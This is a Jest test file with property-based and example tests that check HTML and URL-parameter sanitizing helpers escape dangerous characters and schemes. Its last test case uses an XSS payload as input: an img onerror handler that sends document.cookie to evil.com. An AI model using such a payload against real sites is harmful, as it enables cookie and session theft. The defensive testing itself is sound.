import { test, fc } from '@fast-check/jest';
import { EscapingHelpers } from '../../../src/utilities/helpers/escaping-helpers';
import { RoutingHelpers } from '../../../src/utilities/helpers/routing-helpers';

describe('EscapingHelpers - property-based tests', () => {
  describe('sanitizeHtml', () => {
    test.prop([fc.string()])('never contains dangerous protocol schemes', (input) => {
      const result = EscapingHelpers.sanitizeHtml(input);
      expect(result.toLowerCase()).not.toContain('javascript:');
      expect(result.toLowerCase()).not.toContain('data:');
      expect(result.toLowerCase()).not.toContain('vbscript:');
    });

    test.prop([fc.string()])('never contains unescaped angle brackets or quotes', (input) => {
      const result = EscapingHelpers.sanitizeHtml(input);
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
      expect(result).not.toContain('"');
      expect(result).not.toContain("'");
    });

    test.prop([fc.string()])('ampersands are always escaped', (input) => {
      const result = EscapingHelpers.sanitizeHtml(input);
      const withoutEntities = result.replace(/&amp;|&lt;|&gt;|&quot;|&#39;/g, '');
      expect(withoutEntities).not.toContain('&');
    });
  });

  describe('sanitizeParam', () => {
    test.prop([fc.string()])('never contains unescaped dangerous characters', (input) => {
      const result = EscapingHelpers.sanitizeParam(input);
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
      expect(result).not.toContain('"');
      expect(result).not.toContain("'");
      expect(result).not.toContain('/');
    });

    test.prop([fc.string()])('is idempotent', (input) => {
      const once = EscapingHelpers.sanitizeParam(input);
      const twice = EscapingHelpers.sanitizeParam(once);
      expect(twice).toBe(once);
    });
  });

  describe('sanitizeParamsMap', () => {
    test.prop([fc.dictionary(fc.string({ minLength: 1 }), fc.string())])(
      'all keys and values are sanitized',
      (paramsMap) => {
        const result = RoutingHelpers.sanitizeParamsMap(paramsMap);
        for (const key of Object.keys(result)) {
          expect(key).not.toContain('<');
          expect(key).not.toContain('>');
          expect(key).not.toContain('/');
        }
        for (const value of Object.values(result)) {
          expect(value).not.toContain('<');
          expect(value).not.toContain('>');
          expect(value).not.toContain('/');
        }
      }
    );
  });

  describe('sanatizeHtmlExceptTextFormatting', () => {
    it('should return empty string when no argument is passed', () => {
      const result = EscapingHelpers.sanatizeHtmlExceptTextFormatting();
      expect(result).toEqual('');
    });

    it('should sanitize given string with allowed html tags', () => {
      const text = '<i> <b> <br> <mark> <strong> <em> <small> <del> <ins> <sub> <sup>';
      const result = EscapingHelpers.sanatizeHtmlExceptTextFormatting(text);
      expect(result).toEqual('<i> <b> <br> <mark> <strong> <em> <small> <del> <ins> <sub> <sup>');
    });

    it('should sanitize given string with not allowed html tags', () => {
      const text = '<a> <img> <div> <span> <button> <table> <script>';
      const result = EscapingHelpers.sanatizeHtmlExceptTextFormatting(text);
      expect(result).toEqual('&lt;a&gt; &lt;img&gt; &lt;div&gt; &lt;span&gt; &lt;button&gt; &lt;table&gt; &lt;script&gt;');
    });

    it.each([
      {
        input: 'Are you sure <b>you want</b> to do this?',
        output: 'Are you sure <b>you want</b> to do this?'
      },
      {
        input: '<img src="https://example.com/logo.png" />',
        output: '&lt;img src=&quot;https://example.com/logo.png&quot; /&gt;'
      },
      {
        input: '<img src=x onerror="fetch(\'https://evil.com?\'+document.cookie)">',
        output: '&lt;img src=x onerror=&quot;fetch(&#39;https://evil.com?&#39;+document.cookie)&quot;&gt;'
      }
    ])('should sanitize random text with html tags', async (data) => {
      const result = EscapingHelpers.sanatizeHtmlExceptTextFormatting(data.input);
      expect(result).toEqual(data.output);
    });
  });
});
